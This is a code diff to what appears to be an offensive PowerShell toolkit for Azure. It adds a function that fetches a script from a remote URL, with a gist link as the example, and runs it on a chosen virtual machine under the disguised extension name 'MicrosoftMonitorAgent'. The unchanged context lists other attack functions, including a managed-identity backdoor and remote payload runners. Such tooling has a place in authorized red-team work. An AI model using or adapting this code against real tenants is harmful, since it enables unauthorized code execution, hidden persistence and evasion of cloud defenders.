@@ -196,6 +196,7 @@ Get-AzureRunbookContent --------- Gets a specific Runbook and displays its conte
 Get-AzureStorageContent --------- Gathers a file from a specific blob or File Share
 Get-AzureVMDisk ----------------- Generates a link to download a Virtual Machiche’s disk. The link is only available for 24 hours.
 Invoke-AzureCommandRunbook ------ Will execute a supplied command or script from a Runbook if the Runbook is configured with a “RunAs” account
+Invoke-AzureCustomScriptExtension Runs a PowerShell script by uploading it as a Custom Script Extension
 Invoke-AzureMIBackdoor ---------- Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
 Invoke-AzureRunCommand ---------- Will run a command or script on a specified VM
 Invoke-AzureRunMSBuild ---------- Will run a supplied MSBuild payload on a specified VM. 
@@ -2140,4 +2141,27 @@ rm C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.9\Downloads\*
 		Write-Host "Agent successfully deployed!" -Foregroundcolor Green
 	}
 	rm $path
+}
+function Invoke-AzureCustomScriptExtension {
+<# 
+.SYNOPSIS
+    Runs a PowerShell script by uploading it as a Custom Script Extension
+
+.PARAMETER 
+    -Uri (URI/URL where the script is located)
+    -VM (VM to run the script on)
+
+.EXAMPLE
+	Invoke-AzureCustomScriptExtension -VM 'Windows10' -Uri https://gist.githubusercontent.com/hausec/fa38e7005be29f959df90044ef4bcc29/raw/18aadb137a660e0c7393a999136685b8d8ab5b87/test.ps1
+#>
+    [CmdletBinding()]
+    Param(
+	[Parameter(Mandatory=$true,HelpMessage='VM name')][String]$VM = $null,
+	[Parameter(Mandatory=$false,HelpMessage='Uri where the script is located')][String]$Uri = $false)
+    
+    If ($Uri){
+    $VMData = Get-AzVM -Name $VM
+    Set-AzVMCustomScriptExtension -ResourceGroupName $VMData.ResourceGroupName -VMName $VMData.Name -Location $VMData.Location -FileUri $Uri -Name MicrosoftMonitorAgent
+    }
+
 }
